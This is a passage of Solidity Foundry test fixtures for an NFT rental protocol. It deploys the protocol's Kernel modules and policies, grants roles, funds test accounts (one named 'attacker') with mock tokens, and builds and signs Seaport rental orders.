address(tokenCallbackHandler),\n                    address(safeProxyFactory),\n                    address(safeSingleton)\n                )\n            );\n\n            // Deploy factory policy contract\n            vm.prank(deployer.addr);\n            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));\n\n            // label the contract\n            vm.label(address(factory), \"FactoryPolicy\");\n        }\n\n        function _setupKernel() internal {\n            // Start impersonating the deployer\n            vm.startPrank(deployer.addr);\n\n            // Install modules\n            kernel.executeAction(Actions.InstallModule, address(STORE));\n            kernel.executeAction(Actions.InstallModule, address(ESCRW));\n\n            // Approve policies\n            kernel.executeAction(Actions.ActivatePolicy, address(create));\n            kernel.executeAction(Actions.ActivatePolicy, address(stop));\n            kernel.executeAction(Actions.ActivatePolicy, address(factory));\n            kernel.executeAction(Actions.ActivatePolicy, address(guard));\n            kernel.executeAction(Actions.ActivatePolicy, address(admin));\n\n            // Grant `seaport` role to seaport protocol\n            kernel.grantRole(toRole(\"SEAPORT\"), address(seaport));\n\n            // Grant `signer` role to the protocol signer to sign off on create payloads\n            kernel.grantRole(toRole(\"CREATE_SIGNER\"), rentalSigner.addr);\n\n            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol\n            kernel.grantRole(toRole(\"ADMIN_ADMIN\"), deployer.addr);\n\n            // Grant 'guard_admin` role to the address which can toggle hooks\n            kernel.grantRole(toRole(\"GUARD_ADMIN\"), deployer.addr);\n\n            // Grant `stop_admin` role to the address which can skim funds from the payment escrow\n            kernel.grantRole(toRole(\"STOP_ADMIN\"), deployer.addr);\n\n            // Stop impersonating the deployer\n            vm.stopPrank();\n        }\n\n        function setUp() public virtual override {\n            // setup dependencies\n            super.setUp();\n\n            // create the rental signer address and private key\n            rentalSigner = vm.createWallet(\"rentalSigner\");\n\n            // create the deployer address and private key\n            deployer = vm.createWallet(\"deployer\");\n\n            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)\n            protocolVersion = 0x000000000000000000000100;\n            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);\n\n            // deploy kernel\n            _deployKernel();\n\n            // Deploy payment escrow\n            _deployPaymentEscrowModule();\n\n            // Deploy rental storage\n            _deployStorageModule();\n\n            // deploy create policy\n            _deployCreatePolicy();\n\n            // deploy stop policy\n            _deployStopPolicy();\n\n            // deploy admin policy\n            _deployAdminPolicy();\n\n            // Deploy guard policy\n            _deployGuardPolicy();\n\n            // deploy rental factory\n            _deployFactoryPolicy();\n\n            // intialize the kernel\n            _setupKernel();\n        }\n    }\n\n\n    // Creates test accounts to interact with the V3 protocol\n    // Borrowed from test/fixtures/protocol/AccountCreator\n    contract AccountCreator is Protocol {\n        // Protocol accounts for testing\n        ProtocolAccount public alice;\n        ProtocolAccount public bob;\n        ProtocolAccount public carol;\n        ProtocolAccount public dan;\n        ProtocolAccount public eve;\n        ProtocolAccount public attacker;\n\n        // Mock tokens for testing\n        MockERC20[] public erc20s;\n        MockERC721[] public erc721s;\n        MockERC1155[] public erc1155s;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens\n            _deployTokens(3);\n\n            // instantiate all wallets and deploy rental safes for each\n            alice = _fundWalletAndDeployRentalSafe(\"alice\");\n            bob = _fundWalletAndDeployRentalSafe(\"bob\");\n            carol = _fundWalletAndDeployRentalSafe(\"carol\");\n            dan = _fundWalletAndDeployRentalSafe(\"dan\");\n            eve = _fundWalletAndDeployRentalSafe(\"eve\");\n            attacker = _fundWalletAndDeployRentalSafe(\"attacker\");\n\n\n\n        }\n\n        function _deployTokens(uint256 numTokens) internal {\n            for (uint256 i; i < numTokens; i++) {\n                _deployErc20Token();\n                _deployErc721Token();\n                _deployErc1155Token();\n            }\n        }\n\n        function _deployErc20Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc20s.length;\n\n            // deploy the mock token\n            MockERC20 token = new MockERC20();\n\n            // push the token to the array of mocks\n            erc20s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC20_\", LibString.toString(i)));\n        }\n\n        function _deployErc721Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc721s.length;\n\n            // deploy the mock token\n            MockERC721 token = new MockERC721();\n\n            // push the token to the array of mocks\n            erc721s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC721_\", LibString.toString(i)));\n        }\n\n        function _deployErc1155Token() internal returns (uint256 i) {\n            // save the token's index\n            i = erc1155s.length;\n\n            // deploy the mock token\n            MockERC1155 token = new MockERC1155();\n\n            // push the token to the array of mocks\n            erc1155s.push(token);\n\n            // set the token label with the index\n            vm.label(address(token), string.concat(\"MERC1155_\", LibString.toString(i)));\n        }\n\n        function _deployRentalSafe(\n            address owner,\n            string memory name\n        ) internal returns (address safe) {\n            // Deploy a 1/1 rental safe\n            address[] memory owners = new address[](1);\n            owners[0] = owner;\n            safe = factory.deployRentalSafe(owners, 1);\n\n\n\n        }\n\n        function _fundWalletAndDeployRentalSafe(\n            string memory name\n        ) internal returns (ProtocolAccount memory account) {\n            // create a wallet with a address, public key, and private key\n            Vm.Wallet memory wallet = vm.createWallet(name);\n\n            // deploy a rental safe for the address\n            address rentalSafe = _deployRentalSafe(wallet.addr, name);\n\n            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s\n            _allocateTokensAndApprovals(wallet.addr, 10000);\n\n            // create an account\n            account = ProtocolAccount({\n                addr: wallet.addr,\n                safe: SafeL2(payable(rentalSafe)),\n                publicKeyX: wallet.publicKeyX,\n                publicKeyY: wallet.publicKeyY,\n                privateKey: wallet.privateKey\n            });\n\n        }\n\n        function _allocateTokensAndApprovals(address to, uint128 amount) internal {\n            // deal ether to the recipient\n            vm.deal(to, amount);\n\n            // mint all erc20 tokens to the recipient\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].mint(to, amount);\n            }\n\n            // set token approvals\n            _setApprovals(to);\n        }\n\n        function _setApprovals(address owner) internal {\n            // impersonate the owner address\n            vm.startPrank(owner);\n\n            // set all approvals for erc20 tokens\n            for (uint256 i = 0; i < erc20s.length; ++i) {\n                erc20s[i].approve(address(conduit), type(uint256).max);\n            }\n\n            // set all approvals for erc721 tokens\n            for (uint256 i = 0; i < erc721s.length; ++i) {\n                erc721s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // set all approvals for erc1155 tokens\n            for (uint256 i = 0; i < erc1155s.length; ++i) {\n                erc1155s[i].setApprovalForAll(address(conduit), true);\n            }\n\n            // stop impersonating\n            vm.stopPrank();\n        }\n    }\n\n\n\n    interface ERC1155TokenReceiver {\n\n        function onERC1155Received(\n            address _operator,\n            address _from,\n            uint256 _id,\n            uint256 _value,\n            bytes calldata _data\n        ) external returns (bytes4);\n\n        function onERC1155BatchReceived(\n            address _operator,\n            address _from,\n            uint256[] calldata _ids,\n            uint256[] calldata _values,\n            bytes calldata _data\n        ) external returns (bytes4);\n    }\n\n    interface ERC721TokenReceiver {\n        function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes calldata _data) external returns (bytes4);\n    }\n\n    interface IERC165 {\n        function supportsInterface(bytes4 interfaceId) external view returns (bool);\n    }\n\n\n    /**\n    * Borrowed from gnosis safe smart contracts\n    * @title Default Callback Handler - Handles supported tokens' callbacks, allowing Safes receiving these tokens.\n    * @author Richard Meissner - @rmeissner\n    */\n    contract TokenCallbackHandler is ERC1155TokenReceiver, ERC721TokenReceiver, IERC165 {\n        /**\n        * @notice Handles ERC1155 Token callback.\n        * return Standardized onERC1155Received return value.\n        */\n        function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0xf23a6e61;\n        }\n\n        /**\n        * @notice Handles ERC1155 Token batch callback.\n        * return Standardized onERC1155BatchReceived return value.\n        */\n        function onERC1155BatchReceived(\n            address,\n            address,\n            uint256[] calldata,\n            uint256[] calldata,\n            bytes calldata\n        ) external pure override returns (bytes4) {\n            return 0xbc197c81;\n        }\n\n        /**\n        * @notice Handles ERC721 Token callback.\n        *  return Standardized onERC721Received return value.\n        */\n        function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {\n            return 0x150b7a02;\n        }\n\n        /**\n        * @notice Handles ERC777 Token callback.\n        * return nothing (not standardized)\n        */\n        function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external pure {\n            // We implement this for completeness, doesn't really have any value\n        }\n\n        /**\n        * @notice Implements ERC165 interface support for ERC1155TokenReceiver, ERC721TokenReceiver and IERC165.\n        * @param interfaceId Id of the interface.\n        * @return if the interface is supported.\n        */\n        function supportsInterface(bytes4 interfaceId) external view virtual override returns (bool) {\n            return\n                interfaceId == type(ERC1155TokenReceiver).interfaceId ||\n                interfaceId == type(ERC721TokenReceiver).interfaceId ||\n                interfaceId == type(IERC165).interfaceId;\n        }\n\n    }\n\n\n\n    // Sets up logic in the test engine related to order creation\n    // Borrowed from test/fixtures/engine/OrderCreator\n    contract OrderCreator is AccountCreator {\n        using OfferItemLib for OfferItem;\n        using ConsiderationItemLib for ConsiderationItem;\n        using OrderComponentsLib for OrderComponents;\n        using OrderLib for Order;\n        using ECDSA for bytes32;\n\n        // defines a config for a standard order component\n        string constant STANDARD_ORDER_COMPONENTS = \"standard_order_components\";\n\n        struct OrderToCreate {\n            ProtocolAccount offerer;\n            OfferItem[] offerItems;\n            ConsiderationItem[] considerationItems;\n            OrderMetadata metadata;\n        }\n\n        // keeps track of tokens used during a test\n        uint256[] usedOfferERC721s;\n        uint256[] usedOfferERC1155s;\n\n        uint256[] usedConsiderationERC721s;\n        uint256[] usedConsiderationERC1155s;\n\n        // components of an order\n        OrderToCreate orderToCreate;\n\n        function setUp() public virtual override {\n            super.setUp();\n\n            // Define a standard OrderComponents struct which is ready for\n            // use with the Create Policy and the protocol conduit contract\n            OrderComponentsLib\n                .empty()\n                .withOrderType(SeaportOrderType.FULL_RESTRICTED)\n                .withZone(address(create))\n                .withStartTime(block.timestamp)\n                .withEndTime(block.timestamp + 100)\n                .withSalt(123456789)\n                .withConduitKey(conduitKey)\n                .saveDefault(STANDARD_ORDER_COMPONENTS);\n\n            // for each test token, create a storage slot\n            for (uint256 i = 0; i < erc721s.length; i++) {\n                usedOfferERC721s.push();\n                usedConsiderationERC721s.push();\n\n                usedOfferERC1155s.push();\n                usedConsiderationERC1155s.push();\n            }\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                                Order Creation                               //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order based on the provided context. The defaults on this order\n        // are good for most test cases.\n        function createOrder(\n            ProtocolAccount memory offerer,\n            OrderType orderType,\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers,\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) internal {\n            // require that the number of offer items or consideration items\n            // dont exceed the number of test tokens\n            require(\n                erc721Offers <= erc721s.length &&\n                    erc721Offers <= erc1155s.length &&\n                    erc20Offers <= erc20s.length,\n                \"TEST: too many offer items defined\"\n            );\n            require(\n                erc721Considerations <= erc721s.length &&\n                    erc1155Considerations <= erc1155s.length &&\n                    erc20Considerations <= erc20s.length,\n                \"TEST: too many consideration items defined\"\n            );\n\n            // create the offerer\n            _createOfferer(offerer);\n\n            // add the offer items\n            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);\n\n            // create the consideration items\n            _createConsiderationItems(\n                erc721Considerations,\n                erc1155Considerations,\n                erc20Considerations\n            );\n\n            // Create order metadata\n            _createOrderMetadata(orderType);\n        }\n\n        // Creates an offerer on the order to create\n        function _createOfferer(ProtocolAccount memory offerer) private {\n            orderToCreate.offerer = offerer;\n        }\n\n        // Creates offer items which are good for most tests\n        function _createOfferItems(\n            uint256 erc721Offers,\n            uint256 erc1155Offers,\n            uint256 erc20Offers\n        ) private {\n            // generate the ERC721 offer items\n            for (uint256 i = 0; i < erc721Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // mint an erc721 to the offerer\n                erc721s[i].mint(orderToCreate.offerer.addr);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC721s[i]++;\n            }\n\n            // generate the ERC1155 offer items\n            for (uint256 i = 0; i < erc1155Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedOfferERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // mint an erc1155 to the offerer\n                erc1155s[i].mint(orderToCreate.offerer.addr, 100);\n\n                // update the used token so it cannot be used again in the same test\n                usedOfferERC1155s[i]++;\n            }\n\n            // generate the ERC20 offer items\n            for (uint256 i = 0; i < erc20Offers; ++i) {\n                // create the offer item\n                orderToCreate.offerItems.push(\n                    OfferItemLib\n                        .empty()\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates consideration items that are good for most tests\n        function _createConsiderationItems(\n            uint256 erc721Considerations,\n            uint256 erc1155Considerations,\n            uint256 erc20Considerations\n        ) private {\n            // generate the ERC721 consideration items\n            for (uint256 i = 0; i < erc721Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC721)\n                        .withToken(address(erc721s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])\n                        .withStartAmount(1)\n                        .withEndAmount(1)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC721s[i]++;\n            }\n\n            // generate the ERC1155 consideration items\n            for (uint256 i = 0; i < erc1155Considerations; ++i) {\n                // create the consideration item, and set the recipient as the offerer's\n                // rental safe address\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(orderToCreate.offerer.safe))\n                        .withItemType(ItemType.ERC1155)\n                        .withToken(address(erc1155s[i]))\n                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n\n                // update the used token so it cannot be used again in the same test\n                usedConsiderationERC1155s[i]++;\n            }\n\n            // generate the ERC20 consideration items\n            for (uint256 i = 0; i < erc20Considerations; ++i) {\n                // create the offer item\n                orderToCreate.considerationItems.push(\n                    ConsiderationItemLib\n                        .empty()\n                        .withRecipient(address(ESCRW))\n                        .withItemType(ItemType.ERC20)\n                        .withToken(address(erc20s[i]))\n                        .withStartAmount(100)\n                        .withEndAmount(100)\n                );\n            }\n        }\n\n        // Creates a order metadata that is good for most tests\n        function _createOrderMetadata(OrderType orderType) private {\n            // Create order metadata\n            orderToCreate.metadata.orderType = orderType;\n            orderToCreate.metadata.rentDuration = 500;\n            orderToCreate.metadata.emittedExtraData = new bytes(0);\n        }\n\n        // creates a signed seaport order ready to be fulfilled by a renter\n        function _createSignedOrder(\n            ProtocolAccount memory _offerer,\n            OfferItem[] memory _offerItems,\n            ConsiderationItem[] memory _considerationItems,\n            OrderMetadata memory _metadata\n        ) private view returns (Order memory order, bytes32 orderHash) {\n            // Build the order components\n            OrderComponents memory orderComponents = OrderComponentsLib\n                .fromDefault(STANDARD_ORDER_COMPONENTS)\n                .withOfferer(_offerer.addr)\n                .withOffer(_offerItems)\n                .withConsideration(_considerationItems)\n                .withZoneHash(create.getOrderMetadataHash(_metadata))\n                .withCounter(seaport.getCounter(_offerer.addr));\n\n            // generate the order hash\n            orderHash = seaport.getOrderHash(orderComponents);\n\n            // generate the signature for the order components\n            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);\n\n            // create the order, but dont provide a signature if its a PAYEE order.\n            // Since PAYEE orders are fulfilled by the offerer of the order, they\n            // dont need a signature.\n            if (_metadata.orderType == OrderType.PAYEE) {\n                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());\n            } else {\n                order = OrderLib\n                    .empty()\n                    .withParameters(orderComponents.toOrderParameters())\n                    .withSignature(signature);\n            }\n        }\n\n        function _signSeaportOrder(\n            uint256 signerPrivateKey,\n            bytes32 orderHash\n        ) private view returns (bytes memory signature) {\n            // fetch domain separator from seaport\n            (, bytes32 domainSeparator, ) = seaport.information();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(orderHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                               Order Amendments                              //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function resetOrderToCreate() internal {\n            delete orderToCreate;\n        }\n\n        function withOfferer(ProtocolAccount memory _offerer) internal {\n            orderToCreate.offerer = _offerer;\n        }\n\n        function resetOfferer() internal {\n            delete orderToCreate.offerer;\n        }\n\n        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {\n            // reset all current offer items\n            resetOfferItems();\n\n            // add the new offer items to storage\n            for (uint256 i = 0; i < _offerItems.length; i++) {\n                orderToCreate.offerItems.push(_offerItems[i]);\n            }\n        }\n\n        function withOfferItem(OfferItem memory offerItem) internal {\n            orderToCreate.offerItems.push(offerItem);\n        }\n\n        function resetOfferItems() internal {\n            delete orderToCreate.offerItems;\n        }\n\n        function popOfferItem() internal {\n            orderToCreate.offerItems.pop();\n        }\n\n        function withReplacedConsiderationItems(\n            ConsiderationItem[] memory _considerationItems\n        ) internal {\n            // reset all current consideration items\n            resetConsiderationItems();\n\n            // add the new consideration items to storage\n            for (uint256 i = 0; i < _considerationItems.length; i++) {\n                orderToCreate.considerationItems.push(_considerationItems[i]);\n            }\n        }\n\n        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {\n            orderToCreate.considerationItems.push(considerationItem);\n        }\n\n        function resetConsiderationItems() internal {\n            delete orderToCreate.considerationItems;\n        }\n\n        function popConsiderationItem() internal {\n            orderToCreate.considerationItems.pop();\n        }\n\n        function withHooks(Hook[] memory hooks) internal {\n            // delete the current metatdata hooks\n            delete orderToCreate.metadata.hooks;\n\n            // add each metadata hook to storage\n            for (uint256 i = 0; i < hooks.length; i++) {\n                orderToCreate.metadata.hooks.push(hooks[i]);\n            }\n        }\n\n        function withOrderMetadata(OrderMetadata memory _metadata) internal {\n            // update the static metadata parameters\n            orderToCreate.metadata.orderType = _metadata.orderType;\n            orderToCreate.metadata.rentDuration = _metadata.rentDuration;\n            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;\n\n            // update the hooks\n            withHooks(_metadata.hooks);\n        }\n\n        function resetOrderMetadata() internal {\n            delete orderToCreate.metadata;\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                              Order Finalization                             //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function finalizeOrder()\n            internal\n            returns (Order memory, bytes32, OrderMetadata memory)\n        {\n            // create and sign the order\n            (Order memory order, bytes32 orderHash) = _createSignedOrder(\n                orderToCreate.offerer,\n                orderToCreate.offerItems,\n                orderToCreate.considerationItems,\n                orderToCreate.metadata\n            );\n\n            // pull order metadata into memory\n            OrderMetadata memory metadata = orderToCreate.metadata;\n\n            // clear structs\n            resetOrderToCreate();\n\n            return (order, orderHash, metadata);\n        }\n    }\n\n\n    // Sets up logic in the test engine related to order fulfillment\n    // Borrowed from test/fixtures/engine/OrderFulfiller\n    contract OrderFulfiller is OrderCreator {\n        using ECDSA for bytes32;\n\n        struct OrderToFulfill {\n            bytes32 orderHash;\n            RentPayload payload;\n            AdvancedOrder advancedOrder;\n        }\n\n        // components of a fulfillment\n        ProtocolAccount fulfiller;\n        OrderToFulfill[] ordersToFulfill;\n        Fulfillment[] seaportMatchOrderFulfillments;\n        FulfillmentComponent[][] seaportOfferFulfillments;\n        FulfillmentComponent[][] seaportConsiderationFulfillments;\n        address seaportRecipient;\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                             Fulfillment Creation                            //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        // creates an order fulfillment\n        function createOrderFulfillment(\n            ProtocolAccount memory _fulfiller,\n            Order memory order,\n            bytes32 orderHash,\n            OrderMetadata memory metadata\n        ) internal {\n            // set the fulfiller account\n            fulfiller = _fulfiller;\n\n            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via\n            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well\n            seaportRecipient = address(_fulfiller.safe);\n\n            // get a pointer to a new order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();\n\n            // create an order fulfillment\n            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));\n\n            // add the order hash and fulfiller\n            orderToFulfill.orderHash = orderHash;\n\n            // create rental zone payload data\n            _createRentalPayload(\n                orderToFulfill.payload,\n                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)\n            );\n\n            // generate the signature for the payload\n            bytes memory signature = _signProtocolOrder(\n                rentalSigner.privateKey,\n                create.getRentPayloadHash(orderToFulfill.payload)\n            );\n\n            // create an advanced order from the order. Pass the rental\n            // payload as extra data\n            _createAdvancedOrder(\n                orderToFulfill.advancedOrder,\n                AdvancedOrder(\n                    order.parameters,\n                    1,\n                    1,\n                    order.signature,\n                    abi.encode(orderToFulfill.payload, signature)\n                )\n            );\n        }\n\n        function _createOrderFulfiller(\n            ProtocolAccount storage storageFulfiller,\n            ProtocolAccount memory _fulfiller\n        ) private {\n            storageFulfiller.addr = _fulfiller.addr;\n            storageFulfiller.safe = _fulfiller.safe;\n            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;\n            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;\n            storageFulfiller.privateKey = _fulfiller.privateKey;\n        }\n\n        function _createOrderFulfillment(\n            OrderFulfillment storage storageFulfillment,\n            OrderFulfillment memory fulfillment\n        ) private {\n            storageFulfillment.recipient = fulfillment.recipient;\n        }\n\n        function _createOrderMetadata(\n            OrderMetadata storage storageMetadata,\n            OrderMetadata memory metadata\n        ) private {\n            // Create order metadata in storage\n            storageMetadata.orderType = metadata.orderType;\n            storageMetadata.rentDuration = metadata.rentDuration;\n            storageMetadata.emittedExtraData = metadata.emittedExtraData;\n\n            // dynamically push the hooks from memory to storage\n            for (uint256 i = 0; i < metadata.hooks.length; i++) {\n                storageMetadata.hooks.push(metadata.hooks[i]);\n            }\n        }\n\n        function _createRentalPayload(\n            RentPayload storage storagePayload,\n            RentPayload memory payload\n        ) private {\n            // set payload fulfillment on the order to fulfill\n            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);\n\n            // set payload metadata on the order to fulfill\n            _createOrderMetadata(storagePayload.metadata, payload.metadata);\n\n            // set payload expiration on the order to fulfill\n            storagePayload.expiration = payload.expiration;\n\n            // set payload intended fulfiller on the order to fulfill\n            storagePayload.intendedFulfiller = payload.intendedFulfiller;\n        }\n\n        function _createAdvancedOrder(\n            AdvancedOrder storage storageAdvancedOrder,\n            AdvancedOrder memory advancedOrder\n        ) private {\n            // create the order parameters on the order to fulfill\n            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);\n\n            // create the rest of the static parameters on the order to fulfill\n            storageAdvancedOrder.numerator = advancedOrder.numerator;\n            storageAdvancedOrder.denominator = advancedOrder.denominator;\n            storageAdvancedOrder.signature = advancedOrder.signature;\n            storageAdvancedOrder.extraData = advancedOrder.extraData;\n        }\n\n        function _createOrderParameters(\n            OrderParameters storage storageOrderParameters,\n            OrderParameters memory orderParameters\n        ) private {\n            // create the static order parameters for the order to fulfill\n            storageOrderParameters.offerer = orderParameters.offerer;\n            storageOrderParameters.zone = orderParameters.zone;\n            storageOrderParameters.orderType = orderParameters.orderType;\n            storageOrderParameters.startTime = orderParameters.startTime;\n            storageOrderParameters.endTime = orderParameters.endTime;\n            storageOrderParameters.zoneHash = orderParameters.zoneHash;\n            storageOrderParameters.salt = orderParameters.salt;\n            storageOrderParameters.conduitKey = orderParameters.conduitKey;\n            storageOrderParameters.totalOriginalConsiderationItems = orderParameters\n                .totalOriginalConsiderationItems;\n\n            // create the dynamic order parameters for the order to fulfill\n            for (uint256 i = 0; i < orderParameters.offer.length; i++) {\n                storageOrderParameters.offer.push(orderParameters.offer[i]);\n            }\n            for (uint256 i = 0; i < orderParameters.consideration.length; i++) {\n                storageOrderParameters.consideration.push(orderParameters.consideration[i]);\n            }\n        }\n\n        function _createSeaportFulfillment(\n            Fulfillment storage storageFulfillment,\n            Fulfillment memory fulfillment\n        ) private {\n            // push the offer components to storage\n            for (uint256 i = 0; i < fulfillment.offerComponents.length; i++) {\n                storageFulfillment.offerComponents.push(fulfillment.offerComponents[i]);\n            }\n\n            // push the consideration components to storage\n            for (uint256 i = 0; i < fulfillment.considerationComponents.length; i++) {\n                storageFulfillment.considerationComponents.push(\n                    fulfillment.considerationComponents[i]\n                );\n            }\n        }\n\n        function _seaportItemTypeToRentalItemType(\n            SeaportItemType seaportItemType\n        ) internal pure returns (RentalItemType) {\n            if (seaportItemType == SeaportItemType.ERC20) {\n                return RentalItemType.ERC20;\n            } else if (seaportItemType == SeaportItemType.ERC721) {\n                return RentalItemType.ERC721;\n            } else if (seaportItemType == SeaportItemType.ERC1155) {\n                return RentalItemType.ERC1155;\n            } else {\n                revert(\"seaport item type not supported\");\n            }\n        }\n\n        function _createRentalOrder(\n            OrderToFulfill memory orderToFulfill\n        ) internal view returns (RentalOrder memory rentalOrder) {\n            // get the order parameters\n            OrderParameters memory parameters = orderToFulfill.advancedOrder.parameters;\n\n            // get the payload\n            RentPayload memory payload = orderToFulfill.payload;\n\n            // get the metadata\n            OrderMetadata memory metadata = payload.metadata;\n\n            // construct a rental order\n            rentalOrder = RentalOrder({\n                seaportOrderHash: orderToFulfill.orderHash,\n                items: new Item[](parameters.offer.length + parameters.consideration.length),\n                hooks: metadata.hooks,\n                orderType: metadata.orderType,\n                lender: parameters.offerer,\n                renter: payload.intendedFulfiller,\n                rentalWallet: payload.fulfillment.recipient,\n                startTimestamp: block.timestamp,\n                endTimestamp: block.timestamp + metadata.rentDuration\n            });\n\n            // for each new offer item being rented, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.offer.length; i++) {\n                // PAYEE orders cannot have offer items\n                require(\n                    metadata.orderType != OrderType.PAYEE,\n                    \"TEST: cannot have offer items in PAYEE order\"\n                );\n\n                // get the offer item\n                OfferItem memory offerItem = parameters.offer[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(offerItem.itemType);\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = offerItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // create a new rental item\n                rentalOrder.items[i] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: offerItem.token,\n                    amount: offerItem.startAmount,\n                    identifier: offerItem.identifierOrCriteria\n                });\n            }\n\n            // for each consideration item in return, create a new item struct to add to the rental order\n            for (uint256 i = 0; i < parameters.consideration.length; i++) {\n                // PAY orders cannot have consideration items\n                require(\n                    metadata.orderType != OrderType.PAY,\n                    \"TEST: cannot have consideration items in PAY order\"\n                );\n\n                // get the offer item\n                ConsiderationItem memory considerationItem = parameters.consideration[i];\n\n                // determine the item type\n                RentalItemType itemType = _seaportItemTypeToRentalItemType(\n                    considerationItem.itemType\n                );\n\n                // determine which entity the payment will settle to\n                SettleTo settleTo = metadata.orderType == OrderType.PAYEE &&\n                    considerationItem.itemType == SeaportItemType.ERC20\n                    ? SettleTo.RENTER\n                    : SettleTo.LENDER;\n\n                // calculate item index offset\n                uint256 itemIndex = i + parameters.offer.length;\n\n                // create a new payment item\n                rentalOrder.items[itemIndex] = Item({\n                    itemType: itemType,\n                    settleTo: settleTo,\n                    token: considerationItem.token,\n                    amount: considerationItem.startAmount,\n                    identifier: considerationItem.identifierOrCriteria\n                });\n            }\n        }\n\n        function _signProtocolOrder(\n            uint256 signerPrivateKey,\n            bytes32 payloadHash\n        ) internal view returns (bytes memory signature) {\n            // fetch domain separator from create policy\n            bytes32 domainSeparator = create.domainSeparator();\n\n            // sign the EIP-712 digest\n            (uint8 v, bytes32 r, bytes32 s) = vm.sign(\n                signerPrivateKey,\n                domainSeparator.toTypedDataHash(payloadHash)\n            );\n\n            // encode the signature\n            signature = abi.encodePacked(r, s, v);\n        }\n\n        /////////////////////////////////////////////////////////////////////////////////\n        //                            Fulfillment Amendments                           //\n        /////////////////////////////////////////////////////////////////////////////////\n\n        function withFulfiller(ProtocolAccount memory _fulfiller) internal {\n            fulfiller = _fulfiller;\n        }\n\n        function withRecipient(address _recipient) internal {\n            seaportRecipient = _recipient;\n        }\n\n        function withAdvancedOrder(\n            AdvancedOrder memory _advancedOrder,\n            uint256 orderIndex\n        ) internal {\n            // get a storage pointer to the order to fulfill\n            OrderToFulfill storage orderToFulfill = ordersToFulfill[orderIndex];\n\n            // set the new advanced order\n            _createAdvancedOrder(orderToFulfill.advancedOrder, _advancedOrder);\n        }\n\n        function withSeaportMatchOrderFulfillment(Fulfillment memory _fulfillment) internal {\n            // get a pointer to a new seaport fulfillment\n            Fulfillment storage fulfillment = seaportMatchOrderFulfillments.push();\n\n            // set the fulfillment\n            